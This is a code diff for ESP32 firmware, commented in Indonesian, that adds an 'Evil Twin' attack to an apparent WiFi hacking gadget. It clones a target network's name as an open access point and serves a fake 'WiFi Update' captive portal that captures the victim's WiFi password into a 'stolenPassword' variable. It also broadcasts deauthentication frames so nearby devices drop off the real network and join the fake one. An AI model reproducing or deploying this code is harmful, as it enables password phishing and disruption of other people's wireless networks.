@@ -8,6 +8,9 @@
 #include "nvs_flash.h"
 #include "globals.h"
 #include "esp_netif.h"
+#include "esp_http_server.h"
+#include "lwip/sys.h"
+#include "lwip/netdb.h"
 
 
 
@@ -42,6 +45,67 @@ const char* rickRollLyrics[] = {
 
 uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+
+
+
+
+// HTML Portal (Simpel tapi meyakinkan)
+const char* login_html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
+                         "<style>body{font-family:sans-serif;text-align:center;} input{padding:10px;width:80%;margin:10px;}</style></head>"
+                         "<body><h2>WiFi Update</h2><p>Masukkan password WiFi untuk update sistem.</p>"
+                         "<form action='/login' method='POST'><input type='password' name='pw' placeholder='Password'><br>"
+                         "<input type='submit' value='UPDATE NOW'></form></body></html>";
+
+// Handler saat orang masukin password
+esp_err_t login_post_handler(httpd_req_t *req) {
+    char buf[100];
+    int ret = httpd_req_recv(req, buf, req->content_len);
+    if (ret > 0) {
+        buf[ret] = '\0';
+        // Ambil data password dari form (format: pw=isi_password)
+        if (strstr(buf, "pw=")) {
+            strcpy(stolenPassword, strchr(buf, '=') + 1);
+            evilTwinState = 2; // Pindah ke layar hasil
+        }
+    }
+    httpd_resp_send(req, "<h1>System Update Started...</h1>", -1);
+    return ESP_OK;
+}
+
+// Handler buat nampilin halaman login (Captive Portal)
+esp_err_t portal_get_handler(httpd_req_t *req) {
+    httpd_resp_send(req, login_html, -1);
+    return ESP_OK;
+}
+
+// Fungsi nyalain Evil Twin
+void startEvilTwin() {
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_APSTA); // AP buat portal, STA buat deauth
+    
+    wifi_config_t ap_config = {
+        .ap = { .authmode = WIFI_AUTH_OPEN, .max_connection = 4 }
+    };
+    strncpy((char*)ap_config.ap.ssid, targetTerkunci.ssid, 32);
+    
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    esp_wifi_start();
+    
+    // Nyalain HTTP Server
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    httpd_handle_t server = NULL;
+    if (httpd_start(&server, &config) == ESP_OK) {
+        httpd_uri_t login_uri = { .uri="/login", .method=HTTP_POST, .handler=login_post_handler };
+        httpd_register_uri_handler(server, &login_uri);
+        httpd_uri_t portal_uri = { .uri="*", .method=HTTP_GET, .handler=portal_get_handler };
+        httpd_register_uri_handler(server, &portal_uri);
+    }
+    
+    isEvilTwin = true;
+    evilTwinState = 1;
+}
+
+
 
 // Tambahin callback sniffer di wifi_system.c
 void station_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
@@ -146,36 +210,7 @@ static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t
     }
 }
 
-// --- TARUH INI DI ATAS FUNGSI EVENT HANDLER ---
-static int retry_count = 0; 
-
-static void wifi_event_handler(void* arg, esp_event_base_t event_base,
-                                int32_t event_id, void* event_data) {
-    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
-        // Kasih napas 100ms biar hardware stabil setelah start
-        vTaskDelay(pdMS_TO_TICKS(100));
-        esp_wifi_connect();
-        printf("Handler: Mencoba Konek ke AP...\n");
-    } 
-    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
-        // Biar gak tahun depan, batasi retry cuma pas statusKoneksi == 0 (sedang usaha)
-        if (statusKoneksi == 0 && retry_count < 3) {
-            retry_count++;
-            vTaskDelay(pdMS_TO_TICKS(1000)); // Jeda 1 detik tiap gagal
-            esp_wifi_connect();
-            printf("Gagal, nyoba lagi (%d/3)...\n", retry_count);
-        } else if (statusKoneksi == 0) {
-            statusKoneksi = 2; // GAGAL (Wrong Password / Sinyal ampas)
-            printf("Koneksi Fix Gagal Cok!\n");
-        }
-    } 
-    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
-        statusKoneksi = 1; // BERHASIL
-        retry_count = 0;
-        printf("Koneksi Berhasil! IP didapat.\n");
-    }
-}
-
+// -
 
 
 
@@ -224,61 +259,36 @@ esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_h
                 }
             }
             vTaskDelay(pdMS_TO_TICKS(50)); 
-        } 
-                              else if (triggerConnect) {
-            statusKoneksi = 0; // Connecting...
-            retry_count = 0;
-            
-            // --- BERSIHIN TOTAL ---
-            esp_wifi_disconnect(); 
-            esp_wifi_stop(); // Matiin dulu biar state-nya IDLE
-            
-            wifi_config_t wifi_config = {0};
-            strcpy((char*)wifi_config.sta.ssid, targetTerkunci.ssid);
-            strcpy((char*)wifi_config.sta.password, inputPassword);
+        } else if (triggerEvilTwin) {
+    startEvilTwin(); // Fungsi yang tadi gw buatin
+    triggerEvilTwin = false;
+} // --- LOGIKA EVIL TWIN + DEAUTH ---
+else if (isEvilTwin) {
+    // 1. Tembak Deauth ke Target Asli (Biar HP mereka pindah ke WiFi palsu kita)
+    uint8_t apMac[6];
+    stringToMac(targetTerkunci.mac, apMac);
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-            esp_wifi_set_mode(WIFI_MODE_STA);
-            esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
-            
-            // --- KUNCI SAKTI ---
-            // Kita cuma panggil START. Nanti si wifi_event_handler 
-            // bakal otomatis panggil connect pas dapet event STA_START.
-            esp_wifi_start(); 
-            
-            printf("WiFi Mesin Start... Menunggu Handler Konek.\n");
-            triggerConnect = false; 
-        }
+    // Tembak paket deauth singkat (gak usah sebanyak loop deauth biasa biar web server gak berat)
+    for (int b = 0; b < 5; b++) {
+        uint8_t rawFrame[26];
+        memcpy(rawFrame, deauthFrame, 26);
+        memcpy(&rawFrame[4], broadcast, 6);
+        memcpy(&rawFrame[10], apMac, 6);
+        memcpy(&rawFrame[16], apMac, 6);
+        esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+    }
+    
+    // 2. Kalau password sudah dapet, kita hentikan serangan otomatis
+    if (evilTwinState == 2) {
+        // Biarin korban tetep konek buat liat pesan "Update Success"
+        // tapi kita kurangi intensitas deauth atau stop
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(50)); // Jeda dikit biar web server tetep responsif
+}
 
 
-
-
-
-
-        if (triggerDisconnect) {
-            statusKoneksi = 3; // Set ke status "Disconnecting"
-            appMode = 12;      // Pindah ke layar status
-            
-            esp_wifi_disconnect();
-            esp_wifi_stop(); // Matiin radionya biar bersih
-            
-            // RESET SEMUA STATUS KONEKSI
-            isWiFiConnected = false;
-            memset(connSSID, 0, sizeof(connSSID));
-            connRSSI = 0;
-            connCH = 0;
-            inputPassword[0] = '\0'; // Hapus password yang tadi diketik
-            
-            vTaskDelay(pdMS_TO_TICKS(1500)); // Animasi disconnecting bentar
-            
-            statusKoneksi = 4; // Set ke status "Disconnected"
-            triggerDisconnect = false;
-
-            vTaskDelay(pdMS_TO_TICKS(2000)); // Tahan 2 detik biar kebaca
-            
-            // KEMBALI KE MENU UTAMA
-            appMode = 0; 
-            inSubMenu = true; // Langsung masuk ke list menu WiFi
-        }
 
 
 
